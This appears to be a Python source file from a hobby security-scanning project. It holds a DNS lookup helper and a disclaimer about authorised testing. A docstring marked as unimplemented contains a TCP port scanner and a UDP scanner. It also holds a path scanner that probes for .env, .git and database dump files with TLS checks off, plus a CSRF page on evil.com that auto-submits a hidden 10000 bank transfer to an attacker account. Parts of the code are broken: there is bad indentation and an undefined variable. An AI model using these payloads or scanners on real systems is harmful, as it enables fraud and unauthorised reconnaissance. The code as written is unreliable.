"""
Short version (suitable for README header):

⚠️ This project is for legal and authorized security testing only.
Unauthorized scanning may be illegal.
The authors take no responsibility for user actions.

But u can scan 127.0.0.1
its your own ip!
"""


import socket
from urllib.parse import urlparse
import logging

from aiohttp.log import client_logger
from httpx import AsyncClient
from mitmproxy.connection import Client
from tornado.netutil import is_valid_ip


def ensure_protocol(domain):
    default1 = 'https'
    if not domain.startswith('http://') and not domain.startswith('https://'):
        return f'{default1}://{domain}'
    return domain


def get_host_ip(full_domain:str) -> dict:
    if not full_domain:
        return {'success':'False','message':'illegal domain name, please check again'}
    full_domain = ensure_protocol(full_domain)
    parsed_domain = urlparse(full_domain)
    hostname = parsed_domain.hostname

    try:
        ipv4 = socket.gethostbyname(hostname)
        ipv6 = socket.getaddrinfo(hostname,None, socket.AF_INET6)
        return {'success':True, 'message':f'the host = {hostname},ipv4 = {ipv4} ipv6={ipv6}'}
    except socket.gaierror as e:
        return {'success':'error','message':'illegal domain name, please check again'}
    except Exception as e:
        return {'success':'error','message':f'error{e}'}



"""
Due to the sensitive nature of the following functions, in order to comply with laws and maintain social/cyberspace order, these functions will not be implemented.



def socket_scanner(ip:str,port:str) -> dict:
    #no scapy because syn scan is same then attack symbol
    sock = None
    try:
        port = int(port)
    except (ValueError,TypeError):
        return{'success':False,'message':'invalid port'}
    except Exception as e:
        #wtf this can be error?
        logging.error(f'Error:{e}!')
        return {'success': 'error', 'message': f'System error'}
    if not is_valid_ip(ip) or not is_valid_port(port):
        return{'success':False,'message':'invalid ip or port'}
    if ':' in ip:

        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip,port,0,0))
            if result == 0:
                return {'success':True, 'message':f'ip:{ip} port: {port} is open'}
            else:
                return {'success': False, 'message': f'ip:{ip} port: {port} is closed'}
        except socket.timeout as e:
            logging.error(f'TimeoutError:{e}!')
            return {'success': 'error', 'message': f'Web connect error'}
        except OSError as e:
            if e.errno == 97:
                return {'success': 'error', 'message': f"ip does not support ipv6"}
            else:
                logging.error(f'Error:{e}!')
                return {'success': 'error', 'message': f'System error'}

        except Exception as e:
            logging.error(f'Error:{e}!')
            return {'success': 'error', 'message': f'System error'}
        finally:
            if sock:
                sock.close()


    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip,port))
        if result == 0:
            return {'success':True, 'message':f'ip:{ip} port: {port} is open'}
        else:
            return {'success': False, 'message': f'ip:{ip} port: {port} is closed'}
    except socket.timeout as e:
        logging.error(f'TimeoutError:{e}!')
        return {'success': 'error', 'message': f'Web connect error'}
    except Exception as e:
        logging.error(f'Error:{e}!')
        return{'success':'error','message':f'system error'}
    finally:
        if sock:
            sock.close()





from urllib.parse import urlparse
import httpx
import asyncio
class httpx_scanner:
    def __init__(self,base_url:str):
        if base_url.endswith('/'):
            try:
                base_url = base_url.removesuffix('/')
                parsed_url = urlparse(base_url)
                scheme = parsed_url.scheme
                netloc = parsed_url.netloc
                if scheme:
                    self.url = f'{scheme}://{netloc}'
                else:
                    self.url = f"https://{netloc}"
            except (TypeError,ValueError):
                return {'success':False,'message':'url needs to be str'}
            self.paths =[""
                    "admin", "administrator", "login", "dashboard", "manager",
                    "admin/login", "wp-admin", "admincp",
                    # API接口
                    "api", "api/v1", "graphql", "rest", "json",
                    "api/docs", "swagger", "openapi",
                    # 配置文件
                    ".env", "config.php", "config.json", "settings.py",
                    "web.config", "config/database.php",
                    # 备份文件
                    "backup", "backup.zip", "dump.sql", "backup.sql",
                    "wwwroot.rar", "site.tar.gz",
                    # 日志文件
                    "logs", "log", "access.log", "error.log",
                    # 敏感目录
                    ".git", ".svn", ".DS_Store", "phpinfo.php",
                    "test", "debug", "console",
                    # 常见文件
                    "robots.txt", "sitemap.xml", "crossdomain.xml",
                    "package.json", "composer.json"
                ]
    async def single_scan(self,client,url,path):
        try:
            full_url = f"{url}/{path}"
            response = await client.get(full_url,timeout = 2)
            if response.status_code >199 and response.status_code < 400:
                return {'success':'path find','message':f'{path}'}
            else:
                return {'success':None}
        except Exception as e:
            return{'success':f'error:{e}'}
    async def httpx_scan(self,url):
        try:
            async with httpx.AsyncClient(headers={'User-Agent': 'Mozilla/5.0'},follow_redirects=True, verify=False) as client:
            tasks = [self.single_scan(client,url,path) for path in self.paths]
            futures = await asyncio.gather(*tasks,return_exceptions=True)
            result = [future for future in futures
                      if isinstance(future,dict) and future.get('success') == 'path find']
            if result:
                result_str = '\n'.join(item['message'] for item in result)
                return{'success':True,'message':f'{result}'}
            else:
                return{'success':True,'message':f'There is not paths'}
        except httpx.TimeoutException:
            return {'success': False, 'message': f'error: timeout'}
        except httpx.ConnectError:
            return {'success': False, 'message': f'error: ConnectError'}
        except httpx.InvalidURL:
            return {'success': False, 'message': f'error: Invalid URL'}
        except Exception as e:
            return {'success': False, 'message': f'error: {e}'}
bro……costs me two hours







<!-- evil.com 上的恶意页面 -->
<html>
<body>
    <!-- 隐藏的iframe或自动提交表单 -->
    <form id="csrfForm" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="hacker_123">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="note" value="这是CSRF攻击演示">
    </form>
    
    <script>
        // 页面加载后自动提交表单
        document.getElementById('csrfForm').submit();
    </script>
    
    <h1>欢迎来到抽奖网站！</h1>
    <p>您可能中奖了...</p>
</body>
</html>


<script>
// 现代方式 - 使用fetch API
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',  // 关键！携带Cookie
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        to_account: 'hacker_123', 
        amount: 10000
    })
})
</script>





import socket
import time


def udp_scan(target_ip, port):

    
    
    try:

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(3)

            sock.sendto(b'hello!!!', (target_ip, port))
    
            try:
    
                data, addr = sock.recvfrom(1024)
                print(f"{ip}:{port}:[OPEN]")

            except socket.timeout:
                print(f"{ip}:{port}:filtered")

            except ConnectionRefusedError:
                return "closed"

    except Exception as e:
        return f"error: {str(e)}"
    finally:
        sock.close()
"""